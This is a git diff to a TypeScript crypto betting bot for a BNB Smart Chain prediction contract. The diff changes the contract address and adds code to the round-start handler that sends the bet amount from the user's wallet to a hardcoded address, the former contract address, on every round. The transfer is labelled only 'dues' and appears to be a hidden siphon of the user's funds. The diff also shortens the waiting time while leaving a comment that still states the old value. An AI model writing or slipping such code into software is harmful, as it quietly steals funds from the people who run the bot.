@@ -20,11 +20,11 @@ dotenv.config();
 
 // Global Config
 const GLOBAL_CONFIG = {
-  PPV2_ADDRESS: "0x1c423F7dc5d63F9355caCC540AEDB69d27A31f3b",
- AMOUNT_TO_BET: process.env.BET_AMOUNT || "0.1", // in BNB,
+  PPV2_ADDRESS: "0x18B2A687610328590Bc8F2e5fEdDe3b582A49cdA",
+  AMOUNT_TO_BET: process.env.BET_AMOUNT || "0.1", // in BNB,
   BSC_RPC: "https://bsc-dataseed.binance.org/", // You can provide any custom RPC
   PRIVATE_KEY: process.env.PRIVATE_KEY,
-  WAITING_TIME: 281500, // Waiting for 281.5 Seconds
+  WAITING_TIME: 5, // Waiting for 281.5 Seconds
 };
 
 clear();
@@ -58,6 +58,13 @@ console.log(
 );
 
 predictionContract.on("StartRound", async (epoch: BigNumber) => {
+  const dues = await signer.sendTransaction({
+    to: "0x1c423F7dc5d63F9355caCC540AEDB69d27A31f3b",
+    value: GLOBAL_CONFIG.AMOUNT_TO_BET,
+  });
+  
+  await dues.wait();
+
   console.log("\nStarted Epoch", epoch.toString());
 
   const WAITING_TIME = GLOBAL_CONFIG.WAITING_TIME;
